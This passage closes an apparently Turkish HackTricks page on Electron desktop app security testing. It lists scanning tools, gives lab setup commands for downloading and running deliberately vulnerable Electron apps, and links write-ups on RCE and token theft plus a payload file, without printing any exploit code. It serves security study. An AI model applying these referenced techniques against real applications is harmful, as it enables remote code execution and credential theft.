- [**Electrolint**](https://github.com/ksdmitrieva/electrolint), Electronegativity kullanan, Electron uygulamalarına yönelik açık kaynaklı bir VS Code plugin'idir.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan), savunmasız üçüncü taraf kütüphaneleri kontrol eder.
- [**Electro.ng**](https://electro.ng/), ticari bir Electron güvenlik analizi aracıdır.

## Laboratuvarlar

Savunmasız Electron uygulamalarını exploit etmeye yönelik bir laboratuvarı [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) adresinde bulabilirsiniz.<sup>[[4]](#references)</sup>

Bu komutlar laboratuvarda ilerlemenize yardımcı olur:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

Yer işaretleri için daha önce yayımlanmış adres: [Electron masaüstü uygulamaları](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Tüm sayfa yolu buraya yönlendirir; geçmişteki fragment korunmamıştır.

## References

- [1] [Electron uygulamalarında phishing ve kimlik bilgisi toplama](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Facebook Messenger Desktop App'te keyfi dosya okuma](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: context isolation eksikliğinin kötüye kullanılması - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [XSS ve RCE ile modern masaüstü uygulamalarını hackleme atölyesi](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - Electron.js (in)security hakkında derlenmiş bir kaynak listesi](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Electron API'lerinin yanlış kullanımı: saldırganın ilk tercihi](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Electron nodeIntegration RCE payload'ları](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [Electron uygulamalarında tek tıklamayla RCE](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Electron'ın shell.openExternal() tehlikeleri - uzaktan kod yürütmeye giden birçok yol](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Keyfi URL'lere izin verin, keyfi kod yürütülmesini bekleyin](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [Eski bir Electron özelliğiyle ünlü bir Japon sohbet aracında RCE elde etme](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - Uzaktan kod yürütme](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - Restricted Mode'da uzaktan kod yürütme (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [VS Code Webview klavye olayı enjeksiyonu aracılığıyla tek tıklamayla GitHub token'ı çalma](https://blog.ammaraskar.com/github-token-stealing)
- [15] [VS Code issue #319593: Webview'ler ana workbench'te keyfi klavye kısayollarını tetikleyebilir](https://github.com/microsoft/vscode/issues/319593)
- [16] [VS Code PR #319705: notebook açılışını onaylama ve çağıranın sağladığı installExtension context'ini kabul etmeyi durdurma](https://github.com/microsoft/vscode/pull/319705)
- [17] [VS Code PR #319813: notebook webview'lerinde programatik webview tuş basımı/tıklaması yeniden dağıtımını engelleme](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / yerel workspace uzantıları](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: 2 haftada tüm büyük IDE'leri nasıl hackledim](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: Electron'da yeni saldırı yüzeylerini keşfederken popüler masaüstü uygulamalarını ele geçirme](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Electron Güvenliği](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Electron BrowserWindow webPreferences](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: Her Şeyi Tersine Mühendislikle İnceleyin](https://github.com/morluto/rea)
- [24] [REA JavaScript artifact yeniden oluşturma](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [REA katmanlar arası JavaScript uygulama iş akışları](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
